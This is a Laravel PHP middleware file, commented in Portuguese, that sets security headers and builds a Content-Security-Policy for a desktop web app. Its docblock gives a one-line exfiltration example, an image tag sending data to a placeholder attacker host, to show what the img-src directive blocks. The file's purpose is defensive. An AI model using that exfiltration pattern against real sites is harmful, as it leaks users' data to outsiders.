<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

/**
 * Cabeçalhos de segurança do desktop.
 *
 * O CSP aqui é deliberadamente permissivo com `script-src 'unsafe-inline'`: as
 * telas têm ~40 blocos <script> inline e handlers onclick/onerror no HTML, então
 * uma política estrita quebraria a interface inteira. Trocar isso por nonces é
 * um refactor grande e independente.
 *
 * Mesmo com 'unsafe-inline', a política vale a pena: ela não impede um script
 * injetado de executar, mas fecha os canais por onde ele mandaria os dados para
 * fora — `connect-src` limita fetch/XHR/WebSocket, `img-src` sem host externo
 * bloqueia o truque do <img src="https://atacante/?dados=...">, `form-action`
 * impede o POST para fora e `base-uri` impede sequestrar URLs relativas.
 */
class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        // Só faz sentido em documentos navegáveis. Downloads e respostas de
        // arquivo trazem os próprios cabeçalhos (ver ConfigurationController).
        $contentType = (string) $response->headers->get('Content-Type', '');
        $isHtml = $contentType === '' || str_contains(strtolower($contentType), 'text/html');

        if ($isHtml) {
            $response->headers->set('Content-Security-Policy', $this->policy());
        }

        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');

        return $response;
    }

    private function policy(): string
    {
        $connect = array_merge(["'self'"], $this->realtimeOrigins(), $this->externalDataOrigins());

        $directives = [
            "default-src 'self'",
            "base-uri 'self'",
            "object-src 'none'",
            "frame-ancestors 'self'",
            "form-action 'self'",
            // blob: cobre as pré-visualizações de foto e o PDF em <iframe>
            // gerados com URL.createObjectURL().
            "img-src 'self' data: blob:",
            "frame-src 'self' blob:",
            "font-src 'self' data:",
            "style-src 'self' 'unsafe-inline'",
            "script-src 'self' 'unsafe-inline'",
            'connect-src '.implode(' ', array_unique($connect)),
            "worker-src 'self' blob:",
            "manifest-src 'self'",
        ];

        return implode('; ', $directives);
    }

    /**
     * Origem do WebSocket do Reverb. Costuma ser a mesma do desktop (o nginx faz
     * proxy de /app/ na 443), mas é declarada explicitamente porque nem todo
     * navegador trata `wss://` da mesma origem como coberto por 'self'.
     *
     * @return array<int, string>
     */
    private function realtimeOrigins(): array
    {
        $host = trim((string) env('REVERB_HOST', ''));

        if ($host === '') {
            return [];
        }

        $port = (int) env('REVERB_PORT', 0);
        $secure = strtolower(trim((string) env('REVERB_SCHEME', 'https'))) === 'https';
        $scheme = $secure ? 'wss' : 'ws';
        $suffix = ($port > 0 && $port !== 443 && $port !== 80) ? ':'.$port : '';

        return [$scheme.'://'.$host.$suffix];
    }

    /**
     * @return array<int, string>
     */
    private function externalDataOrigins(): array
    {
        $origins = config('desktop.csp_connect_src', []);

        return is_array($origins) ? array_values(array_filter(array_map('strval', $origins))) : [];
    }
}
